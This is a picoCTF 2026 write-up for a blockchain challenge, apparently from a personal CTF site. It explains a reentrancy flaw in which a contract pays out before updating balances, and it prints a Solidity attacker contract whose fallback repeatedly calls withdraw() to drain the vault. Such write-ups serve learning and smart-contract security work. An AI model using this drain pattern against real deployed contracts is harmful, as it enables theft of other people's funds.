---
layout: default
title: "picoCTF 2026: reentrance"
level: "Intermediate"
description: "Performing a reentrancy attack to drain a contract's vault by exploiting the order of operations."
category: "picoCTF-BC"
---

## Description
The classic Ethernaut-style reentrancy. Drain the contract of all its funds to get the flag.

## Analysis
The contract follows the "Checks-Interactions-Effects" pattern incorrectly. It sends Ether to the user *before* updating their balance. This allows a malicious contract to call the `withdraw` function repeatedly before the first call finishes.



## Solution
I deployed an attacker contract with a `fallback()` function that calls `withdraw()` again as soon as it receives Ether.

### Attacker Contract:
<pre class="plain-code"><code>
contract Attack {
    IReentrance target;
    constructor(address _target) { target = IReentrance(_target); }

    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    fallback() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}
</code></pre>
